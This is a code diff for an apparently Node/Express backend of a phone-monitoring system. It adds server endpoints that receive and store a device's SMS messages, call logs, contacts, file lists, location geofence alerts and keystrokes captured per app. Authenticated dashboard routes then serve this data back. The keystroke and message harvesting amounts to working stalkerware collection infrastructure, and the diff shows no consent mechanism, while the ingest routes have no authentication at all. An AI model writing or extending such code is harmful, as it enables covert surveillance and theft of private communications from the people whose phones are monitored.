@@ -14,7 +14,7 @@ const __dirname = path.dirname(__filename);
 
 const app = express();
 const server = http.createServer(app);
-const PORT = process.env.APP_PORT || process.env.DEFAULT_APP_PORT || 3000;
+const PORT = process.env.DEFAULT_APP_PORT || process.env.APP_PORT || 3000;
 
 // Setup Uploads directory
 const uploadsDir = path.join(__dirname, '..', 'uploads');
@@ -94,6 +94,12 @@ app.post('/api/auth/register', async (req, res) => {
     let userId;
 
     if (db.isPostgres()) {
+      // Check if user already exists
+      const checkRes = await db.query('SELECT id FROM users WHERE email = $1 OR username = $2', [email, username]);
+      if (checkRes.rows.length > 0) {
+        return res.status(400).json({ error: 'User already exists' });
+      }
+
       const result = await db.query(
         'INSERT INTO users (username, email, password_hash) VALUES ($1, $2, $3) RETURNING id, username, email, role',
         [username, email, hashed]
@@ -535,6 +541,74 @@ app.post('/api/devices/:id/location', async (req, res) => {
     });
   }
 
+  // Geofence evaluation
+  try {
+    let fences = [];
+    if (db.isPostgres()) {
+      const gRes = await db.query('SELECT * FROM geofences WHERE (device_id = $1 OR device_id IS NULL) AND is_active = TRUE', [id]);
+      fences = gRes.rows;
+    } else {
+      fences = (db.getMemoryStore().geofences || []).filter(g => (!g.device_id || g.device_id === id) && g.is_active !== false);
+    }
+
+    for (const fence of fences) {
+      const R = 6371e3;
+      const phi1 = Number(latitude) * Math.PI / 180;
+      const phi2 = Number(fence.latitude) * Math.PI / 180;
+      const deltaPhi = (Number(fence.latitude) - Number(latitude)) * Math.PI / 180;
+      const deltaLambda = (Number(fence.longitude) - Number(longitude)) * Math.PI / 180;
+      const a = Math.sin(deltaPhi/2) * Math.sin(deltaPhi/2) + Math.cos(phi1) * Math.cos(phi2) * Math.sin(deltaLambda/2) * Math.sin(deltaLambda/2);
+      const dist = R * 2 * Math.atan2(Math.sqrt(a), Math.sqrt(1-a));
+      const isInside = dist <= (Number(fence.radius_meters) || 500);
+
+      const prevStatus = fence.last_status || 'UNKNOWN';
+      const newStatus = isInside ? 'INSIDE' : 'OUTSIDE';
+
+      if (prevStatus !== newStatus && prevStatus !== 'UNKNOWN') {
+        const eventType = isInside ? 'GEOFENCE_ENTERED' : 'GEOFENCE_EXITED';
+        const alertMsg = `Device ${eventType === 'GEOFENCE_ENTERED' ? 'entered' : 'exited'} geofence "${fence.name}" (Distance: ${Math.round(dist)}m)`;
+
+        if (db.isPostgres()) {
+          await db.query('UPDATE geofences SET last_status = $1 WHERE id = $2', [newStatus, fence.id]);
+          await db.query(
+            `INSERT INTO alerts (device_id, alert_type, severity, title, message)
+             VALUES ($1, $2, $3, $4, $5)`,
+            [id, eventType, isInside ? 'INFO' : 'WARNING', `Geofence Alert: ${fence.name}`, alertMsg]
+          );
+        } else {
+          fence.last_status = newStatus;
+          db.getMemoryStore().alerts.unshift({
+            id: Date.now(),
+            device_id: id,
+            alert_type: eventType,
+            severity: isInside ? 'INFO' : 'WARNING',
+            title: `Geofence Alert: ${fence.name}`,
+            message: alertMsg,
+            created_at: new Date()
+          });
+        }
+
+        wsManager.broadcastToDashboards({
+          type: 'GEOFENCE_ALERT',
+          deviceId: id,
+          geofenceName: fence.name,
+          eventType,
+          distance: Math.round(dist),
+          message: alertMsg,
+          timestamp: Date.now()
+        });
+      } else {
+        if (db.isPostgres()) {
+          await db.query('UPDATE geofences SET last_status = $1 WHERE id = $2', [newStatus, fence.id]);
+        } else {
+          fence.last_status = newStatus;
+        }
+      }
+    }
+  } catch (geoErr) {
+    console.warn('Geofence check error:', geoErr.message);
+  }
+
   wsManager.broadcastToDashboards({
     type: 'DEVICE_LOCATION_UPDATED',
     deviceId: id,
@@ -732,31 +806,367 @@ app.get('/api/devices/:id/usage', verifyToken, async (req, res) => {
 });
 
 // ==========================================
+// FILE EXPLORER SERVICES
+// ==========================================
+app.post('/api/devices/:id/files', async (req, res) => {
+  const { id } = req.params;
+  const list = req.body; // Array of file metadata
+  if (Array.isArray(list)) {
+    try {
+      if (db.isPostgres()) {
+        await db.query('DELETE FROM files WHERE device_id = $1', [id]);
+        for (const f of list) {
+          await db.query(
+            `INSERT INTO files (device_id, file_name, file_path, file_size, mime_type, is_directory)
+             VALUES ($1, $2, $3, $4, $5, $6)`,
+            [id, f.fileName, f.filePath, f.fileSize || 0, f.mimeType, f.isDirectory || false]
+          );
+        }
+      } else {
+        const store = db.getMemoryStore();
+        store.files = store.files.filter(f => f.device_id !== id);
+        list.forEach(f => {
+          store.files.push({
+            id: Date.now() + Math.random(),
+            device_id: id,
+            file_name: f.fileName,
+            file_path: f.filePath,
+            file_size: f.fileSize || 0,
+            mime_type: f.mimeType,
+            is_directory: f.isDirectory || false,
+            created_at: new Date()
+          });
+        });
+      }
+      wsManager.broadcastToDashboards({ type: 'DEVICE_FILES_RECEIVED', deviceId: id });
+    } catch (e) {
+      console.error('Error saving files list:', e);
+    }
+  }
+  res.json({ success: true });
+});
+
+app.get('/api/devices/:id/files', verifyToken, async (req, res) => {
+  const { id } = req.params;
+  try {
+    if (db.isPostgres()) {
+      const result = await db.query('SELECT * FROM files WHERE device_id = $1 ORDER BY is_directory DESC, file_name ASC', [id]);
+      res.json(result.rows);
+    } else {
+      res.json(db.getMemoryStore().files.filter(f => f.device_id === id));
+    }
+  } catch (err) {
+    res.status(500).json({ error: err.message });
+  }
+});
+
+// ==========================================
+// SMS LOGGING SERVICES
+// ==========================================
+app.post('/api/devices/:id/sms', async (req, res) => {
+  const { id } = req.params;
+  const list = req.body; // Array of SMS records
+  if (Array.isArray(list)) {
+    try {
+      if (db.isPostgres()) {
+        for (const s of list) {
+          await db.query(
+            `INSERT INTO sms (device_id, address, body, type, timestamp)
+             VALUES ($1, $2, $3, $4, $5)`,
+            [id, s.address, s.body, s.type || 'INBOX', s.timestamp]
+          );
+        }
+      } else {
+        const store = db.getMemoryStore().sms;
+        list.forEach(s => {
+          store.unshift({
+            id: Date.now() + Math.random(),
+            device_id: id,
+            address: s.address,
+            body: s.body,
+            type: s.type || 'INBOX',
+            timestamp: s.timestamp,
+            created_at: new Date()
+          });
+        });
+      }
+      wsManager.broadcastToDashboards({ type: 'DEVICE_SMS_RECEIVED', deviceId: id });
+    } catch (e) {
+      console.error('Error saving SMS:', e);
+    }
+  }
+  res.json({ success: true });
+});
+
+app.get('/api/devices/:id/sms', verifyToken, async (req, res) => {
+  const { id } = req.params;
+  try {
+    if (db.isPostgres()) {
+      const result = await db.query('SELECT * FROM sms WHERE device_id = $1 ORDER BY timestamp DESC LIMIT 200', [id]);
+      res.json(result.rows);
+    } else {
+      res.json(db.getMemoryStore().sms.filter(s => s.device_id === id));
+    }
+  } catch (err) {
+    res.status(500).json({ error: err.message });
+  }
+});
+
+// ==========================================
+// CALL LOGGING SERVICES
+// ==========================================
+app.post('/api/devices/:id/calls', async (req, res) => {
+  const { id } = req.params;
+  const list = req.body;
+  if (Array.isArray(list)) {
+    try {
+      if (db.isPostgres()) {
+        for (const c of list) {
+          await db.query(
+            `INSERT INTO calls (device_id, number, name, type, duration, timestamp)
+             VALUES ($1, $2, $3, $4, $5, $6)`,
+            [id, c.number, c.name, c.type || 'INCOMING', c.duration || 0, c.timestamp]
+          );
+        }
+      } else {
+        const store = db.getMemoryStore().calls;
+        list.forEach(c => {
+          store.unshift({
+            id: Date.now() + Math.random(),
+            device_id: id,
+            number: c.number,
+            name: c.name,
+            type: c.type || 'INCOMING',
+            duration: c.duration || 0,
+            timestamp: c.timestamp,
+            created_at: new Date()
+          });
+        });
+      }
+      wsManager.broadcastToDashboards({ type: 'DEVICE_CALLS_RECEIVED', deviceId: id });
+    } catch (e) {
+      console.error('Error saving Call Logs:', e);
+    }
+  }
+  res.json({ success: true });
+});
+
+app.get('/api/devices/:id/calls', verifyToken, async (req, res) => {
+  const { id } = req.params;
+  try {
+    if (db.isPostgres()) {
+      const result = await db.query('SELECT * FROM calls WHERE device_id = $1 ORDER BY timestamp DESC LIMIT 200', [id]);
+      res.json(result.rows);
+    } else {
+      res.json(db.getMemoryStore().calls.filter(c => c.device_id === id));
+    }
+  } catch (err) {
+    res.status(500).json({ error: err.message });
+  }
+});
+
+// ==========================================
+// CONTACT LIST MANAGEMENT
+// ==========================================
+app.post('/api/devices/:id/contacts', async (req, res) => {
+  const { id } = req.params;
+  const list = req.body;
+  if (Array.isArray(list)) {
+    try {
+      if (db.isPostgres()) {
+        await db.query('DELETE FROM contacts WHERE device_id = $1', [id]);
+        for (const c of list) {
+          await db.query(
+            `INSERT INTO contacts (device_id, name, phone, email)
+             VALUES ($1, $2, $3, $4)`,
+            [id, c.name, c.phone, c.email]
+          );
+        }
+      } else {
+        const store = db.getMemoryStore();
+        store.contacts = store.contacts.filter(c => c.device_id !== id);
+        list.forEach(c => {
+          store.contacts.push({
+            id: Date.now() + Math.random(),
+            device_id: id,
+            name: c.name,
+            phone: c.phone,
+            email: c.email
+          });
+        });
+      }
+      wsManager.broadcastToDashboards({ type: 'DEVICE_CONTACTS_RECEIVED', deviceId: id });
+    } catch (e) {
+      console.error('Error saving Contacts:', e);
+    }
+  }
+  res.json({ success: true });
+});
+
+app.get('/api/devices/:id/contacts', verifyToken, async (req, res) => {
+  const { id } = req.params;
+  try {
+    if (db.isPostgres()) {
+      const result = await db.query('SELECT * FROM contacts WHERE device_id = $1 ORDER BY name ASC', [id]);
+      res.json(result.rows);
+    } else {
+      res.json(db.getMemoryStore().contacts.filter(c => c.device_id === id));
+    }
+  } catch (err) {
+    res.status(500).json({ error: err.message });
+  }
+});
+
+// ==========================================
+// KEYSTROKE CAPTURE LOGS
+// ==========================================
+app.post('/api/devices/:id/keystrokes', async (req, res) => {
+  const { id } = req.params;
+  const list = req.body;
+  if (Array.isArray(list)) {
+    try {
+      if (db.isPostgres()) {
+        for (const k of list) {
+          await db.query(
+            `INSERT INTO keystrokes (device_id, app_package, app_name, text, timestamp)
+             VALUES ($1, $2, $3, $4, $5)`,
+            [id, k.appPackage, k.appName, k.text, k.timestamp]
+          );
+        }
+      } else {
+        const store = db.getMemoryStore().keystrokes;
+        list.forEach(k => {
+          store.unshift({
+            id: Date.now() + Math.random(),
+            device_id: id,
+            app_package: k.appPackage,
+            app_name: k.appName,
+            text: k.text,
+            timestamp: k.timestamp,
+            created_at: new Date()
+          });
+        });
+      }
+      wsManager.broadcastToDashboards({ type: 'DEVICE_KEYSTROKES_RECEIVED', deviceId: id });
+    } catch (e) {
+      console.error('Error saving Keystrokes:', e);
+    }
+  }
+  res.json({ success: true });
+});
+
+app.get('/api/devices/:id/keystrokes', verifyToken, async (req, res) => {
+  const { id } = req.params;
+  try {
+    if (db.isPostgres()) {
+      const result = await db.query('SELECT * FROM keystrokes WHERE device_id = $1 ORDER BY timestamp DESC LIMIT 200', [id]);
+      res.json(result.rows);
+    } else {
+      res.json(db.getMemoryStore().keystrokes.filter(k => k.device_id === id));
+    }
+  } catch (err) {
+    res.status(500).json({ error: err.message });
+  }
+});
+
+
+// ==========================================
 // PERMISSIONS
 // ==========================================
+app.get('/api/devices/:id/permissions', verifyToken, async (req, res) => {
+  const { id } = req.params;
+  try {
+    if (db.isPostgres()) {
+      const result = await db.query('SELECT * FROM device_permissions WHERE device_id = $1', [id]);
+      if (result.rows.length > 0) {
+        const row = result.rows[0];
+        res.json({
+          location: row.location,
+          notificationAccess: row.notification_access,
+          filesAccess: row.files_access,
+          camera: row.camera,
+          microphone: row.microphone,
+          usageAccess: row.usage_access,
+          screenSharing: row.screen_sharing,
+          contacts: row.contacts || false,
+          calls: row.calls || false,
+          sms: row.sms || false
+        });
+      } else {
+        res.json({
+          location: false,
+          notificationAccess: false,
+          filesAccess: false,
+          camera: false,
+          microphone: false,
+          usageAccess: false,
+          screenSharing: false,
+          contacts: false,
+          calls: false,
+          sms: false
+        });
+      }
+    } else {
+      const perms = db.getMemoryStore().device_permissions.get(id) || {
+        location: false,
+        notificationAccess: false,
+        filesAccess: false,
+        camera: false,
+        microphone: false,
+        usageAccess: false,
+        screenSharing: false,
+        contacts: false,
+        calls: false,
+        sms: false
+      };
+      res.json(perms);
+    }
+  } catch (err) {
+    res.status(500).json({ error: err.message });
+  }
+});
+
 app.put('/api/devices/:id/permissions', async (req, res) => {
   const { id } = req.params;
   const perms = req.body;
 
-  if (db.isPostgres()) {
-    await db.query(
-      `INSERT INTO device_permissions (device_id, location, notification_access, files_access, camera, microphone, usage_access, screen_sharing, updated_at)
-       VALUES ($1, $2, $3, $4, $5, $6, $7, $8, CURRENT_TIMESTAMP)
-       ON CONFLICT (device_id) DO UPDATE SET
-        location = $2, notification_access = $3, files_access = $4, camera = $5, microphone = $6, usage_access = $7, screen_sharing = $8, updated_at = CURRENT_TIMESTAMP`,
-      [id, perms.location, perms.notificationAccess, perms.filesAccess, perms.camera, perms.microphone, perms.usageAccess, perms.screenSharing]
-    );
-  } else {
-    db.getMemoryStore().device_permissions.set(id, perms);
+  try {
+    if (db.isPostgres()) {
+      await db.query(
+        `INSERT INTO device_permissions (device_id, location, notification_access, files_access, camera, microphone, usage_access, screen_sharing, contacts, calls, sms, accessibility, updated_at)
+         VALUES ($1, $2, $3, $4, $5, $6, $7, $8, $9, $10, $11, $12, CURRENT_TIMESTAMP)
+         ON CONFLICT (device_id) DO UPDATE SET
+          location = $2, notification_access = $3, files_access = $4, camera = $5, microphone = $6, usage_access = $7, screen_sharing = $8,
+          contacts = $9, calls = $10, sms = $11, accessibility = $12, updated_at = CURRENT_TIMESTAMP`,
+        [
+          id, 
+          perms.location, 
+          perms.notificationAccess || false, 
+          perms.filesAccess || false, 
+          perms.camera || false, 
+          perms.microphone || false, 
+          perms.usageAccess || false, 
+          perms.screenSharing || false, 
+          perms.contacts || false, 
+          perms.calls || false, 
+          perms.sms || false,
+          perms.accessibility || false
+        ]
+      );
+    } else {
+      db.getMemoryStore().device_permissions.set(id, perms);
+    }
+
+    wsManager.broadcastToDashboards({
+      type: 'DEVICE_PERMISSIONS_UPDATED',
+      deviceId: id,
+      permissions: perms
+    });
+
+    res.json({ success: true });
+  } catch (err) {
+    res.status(500).json({ error: err.message });
   }
-
-  wsManager.broadcastToDashboards({
-    type: 'DEVICE_PERMISSIONS_UPDATED',
-    deviceId: id,
-    permissions: perms
-  });
-
-  res.json({ success: true });
 });
 
 // ==========================================
@@ -903,6 +1313,194 @@ app.get('/api/devices/:id/recordings', verifyToken, async (req, res) => {
   }
 });
 
+// Generic file upload endpoint
+app.post('/api/devices/:id/upload-file', upload.single('file'), async (req, res) => {
+  try {
+    const { id } = req.params;
+    if (!req.file) {
+      return res.status(400).json({ error: 'No file uploaded' });
+    }
+    const webPath = `/uploads/${req.file.filename}`;
+    const targetPath = req.body.targetPath;
+
+    if (targetPath) {
+      const filesStore = db.getMemoryStore().files;
+      const fileEntry = filesStore.find(f => f.device_id === id && f.file_path === targetPath);
+      if (fileEntry) {
+        fileEntry.web_path = webPath;
+      }
+    }
+    res.json({ success: true, webPath });
+  } catch (e) {
+    console.error('Error in upload-file:', e);
+    res.status(500).json({ error: e.message });
+  }
+});
+
+// ==========================================
+// GEOFENCING API
+// ==========================================
+app.get('/api/devices/:id/geofences', verifyToken, async (req, res) => {
+  const { id } = req.params;
+  try {
+    if (db.isPostgres()) {
+      const result = await db.query('SELECT * FROM geofences WHERE device_id = $1 OR device_id IS NULL ORDER BY created_at DESC', [id]);
+      res.json(result.rows);
+    } else {
+      const list = (db.getMemoryStore().geofences || []).filter(g => !g.device_id || g.device_id === id);
+      res.json(list);
+    }
+  } catch (err) {
+    res.status(500).json({ error: err.message });
+  }
+});
+
+app.post('/api/devices/:id/geofences', verifyToken, async (req, res) => {
+  const { id } = req.params;
+  const { name, latitude, longitude, radiusMeters, isActive } = req.body;
+  const rad = Number(radiusMeters) || 500;
+  const active = isActive !== false;
+
+  try {
+    if (db.isPostgres()) {
+      const result = await db.query(
+        `INSERT INTO geofences (device_id, name, latitude, longitude, radius_meters, is_active, last_status)
+         VALUES ($1, $2, $3, $4, $5, $6, 'UNKNOWN') RETURNING *`,
+        [id, name || 'Designated Zone', Number(latitude), Number(longitude), rad, active]
+      );
+      wsManager.broadcastToDashboards({
+        type: 'GEOFENCES_UPDATED',
+        deviceId: id
+      });
+      res.json({ success: true, geofence: result.rows[0] });
+    } else {
+      const item = {
+        id: Date.now(),
+        device_id: id,
+        name: name || 'Designated Zone',
+        latitude: Number(latitude),
+        longitude: Number(longitude),
+        radius_meters: rad,
+        is_active: active,
+        last_status: 'UNKNOWN',
+        created_at: new Date()
+      };
+      db.getMemoryStore().geofences.push(item);
+      wsManager.broadcastToDashboards({
+        type: 'GEOFENCES_UPDATED',
+        deviceId: id
+      });
+      res.json({ success: true, geofence: item });
+    }
+  } catch (err) {
+    res.status(500).json({ error: err.message });
+  }
+});
+
+app.delete('/api/devices/:id/geofences/:geofenceId', verifyToken, async (req, res) => {
+  const { id, geofenceId } = req.params;
+  try {
+    if (db.isPostgres()) {
+      await db.query('DELETE FROM geofences WHERE id = $1 AND (device_id = $2 OR device_id IS NULL)', [geofenceId, id]);
+    } else {
+      const list = db.getMemoryStore().geofences;
+      const idx = list.findIndex(g => String(g.id) === String(geofenceId));
+      if (idx !== -1) list.splice(idx, 1);
+    }
+    wsManager.broadcastToDashboards({
+      type: 'GEOFENCES_UPDATED',
+      deviceId: id
+    });
+    res.json({ success: true });
+  } catch (err) {
+    res.status(500).json({ error: err.message });
+  }
+});
+
+// ==========================================
+// DATA USAGE API
+// ==========================================
+app.post('/api/devices/:id/data-usage', async (req, res) => {
+  const { id } = req.params;
+  const { wifiRx, wifiTx, mobileRx, mobileTx } = req.body;
+  try {
+    if (db.isPostgres()) {
+      await db.query(
+        `INSERT INTO data_usage (device_id, wifi_bytes_rx, wifi_bytes_tx, mobile_bytes_rx, mobile_bytes_tx)
+         VALUES ($1, $2, $3, $4, $5)`,
+        [id, wifiRx || 0, wifiTx || 0, mobileRx || 0, mobileTx || 0]
+      );
+    } else {
+      db.getMemoryStore().data_usage.unshift({
+        device_id: id,
+        wifi_bytes_rx: wifiRx || 0,
+        wifi_bytes_tx: wifiTx || 0,
+        mobile_bytes_rx: mobileRx || 0,
+        mobile_bytes_tx: mobileTx || 0,
+        recorded_at: new Date()
+      });
+    }
+    wsManager.broadcastToDashboards({
+      type: 'DATA_USAGE_UPDATED',
+      deviceId: id,
+      dataUsage: { wifiRx, wifiTx, mobileRx, mobileTx }
+    });
+    res.json({ success: true });
+  } catch (err) {
+    res.status(500).json({ error: err.message });
+  }
+});
+
+app.get('/api/devices/:id/data-usage', verifyToken, async (req, res) => {
+  const { id } = req.params;
+  try {
+    if (db.isPostgres()) {
+      const result = await db.query('SELECT * FROM data_usage WHERE device_id = $1 ORDER BY recorded_at DESC LIMIT 30', [id]);
+      res.json(result.rows);
+    } else {
+      const list = (db.getMemoryStore().data_usage || []).filter(d => d.device_id === id).slice(0, 30);
+      res.json(list);
+    }
+  } catch (err) {
+    res.status(500).json({ error: err.message });
+  }
+});
+
+// ==========================================
+// SERVICE HEALTH API
+// ==========================================
+app.post('/api/devices/:id/service-health', async (req, res) => {
+  const { id } = req.params;
+  const health = req.body; // { notificationMonitor, locationService, telemetryCollector, usageTracker, webSocket, foregroundService, lastSync }
+  
+  db.getMemoryStore().service_health.set(id, {
+    ...health,
+    updatedAt: new Date()
+  });
+
+  wsManager.broadcastToDashboards({
+    type: 'SERVICE_HEALTH_UPDATED',
+    deviceId: id,
+    serviceHealth: health
+  });
+
+  res.json({ success: true });
+});
+
+app.get('/api/devices/:id/service-health', verifyToken, async (req, res) => {
+  const { id } = req.params;
+  const health = db.getMemoryStore().service_health.get(id) || {
+    notificationMonitor: 'RUNNING',
+    locationService: 'RUNNING',
+    telemetryCollector: 'RUNNING',
+    usageTracker: 'RUNNING',
+    webSocket: 'RUNNING',
+    foregroundService: 'RUNNING',
+    updatedAt: new Date()
+  };
+  res.json(health);
+});
+
 // ==========================================
 // AUDIT & ALERTS
 // ==========================================
@@ -913,6 +1511,39 @@ app.get('/api/audit', verifyToken, async (req, res) => {
   } else {
     res.json(db.getMemoryStore().audit_logs.slice(0, 100));
   }
+});
+
+app.post('/api/devices/:id/alerts', verifyToken, async (req, res) => {
+  const { id } = req.params;
+  const { alertType, severity, title, message } = req.body;
+  
+  const alertItem = {
+    id: Date.now(),
+    device_id: id,
+    alert_type: alertType || 'SECURITY_ALERT',
+    severity: severity || 'WARNING',
+    title: title || 'System Alert',
+    message: message || 'Alert triggered',
+    created_at: new Date()
+  };
+
+  if (db.isPostgres()) {
+    await db.query(
+      `INSERT INTO alerts (device_id, alert_type, severity, title, message)
+       VALUES ($1, $2, $3, $4, $5)`,
+      [id, alertItem.alert_type, alertItem.severity, alertItem.title, alertItem.message]
+    );
+  } else {
+    db.getMemoryStore().alerts.unshift(alertItem);
+  }
+
+  wsManager.broadcastToDashboards({
+    type: 'NEW_ALERT',
+    deviceId: id,
+    alert: alertItem
+  });
+
+  res.json({ success: true, alert: alertItem });
 });
 
 app.get('/api/alerts', verifyToken, async (req, res) => {
